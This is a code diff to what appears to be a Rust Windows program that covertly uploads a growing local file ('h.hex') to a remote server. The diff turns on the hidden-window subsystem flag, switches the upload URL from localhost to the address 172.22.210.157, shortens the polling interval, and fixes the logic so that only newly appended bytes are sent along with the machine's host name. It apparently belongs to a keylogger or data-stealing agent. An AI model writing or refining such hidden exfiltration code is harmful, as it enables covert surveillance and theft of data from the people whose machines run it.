@@ -1,4 +1,4 @@
-//#![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 use windows::{
     Win32::{
         UI::WindowsAndMessaging::{
@@ -28,7 +28,6 @@ use serde_json::json;
 use reqwest::blocking::Client;
 use reqwest::blocking::multipart;
 
-//TOFIX: Do not send the whole file because why send the whole entire file? just send whats new using the same system
 //https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw
 
 fn get_host_name() -> String {
@@ -70,17 +69,19 @@ fn get_file_size(file_path: &str) -> u64 {
 fn upload_file() {
     let mut last_file_size: u64 = 0;
     loop {
-        sleep(Duration::from_secs(10));
+        sleep(Duration::from_secs(5));
         let current_file_size: u64 = get_file_size("h.hex"); // if current file size is LESS THAN the last file size then reset last file size
 
         if current_file_size > last_file_size {
-            last_file_size = current_file_size;
-            let url = "http://127.0.0.1:8082/UploadFile";
+            let url = "http://172.22.210.157:8082/UploadFile";
 
             let mut file = File::open("h.hex").expect("Failed to open file");
             let mut content = Vec::new();
 
             file.seek(SeekFrom::Start(last_file_size)).expect("Failed to set seek");
+
+            last_file_size = current_file_size; //Update the varible here so that the seek can work
+
             file.read_to_end(&mut content).expect("Failed to read file");
 
             let json_data = json!({
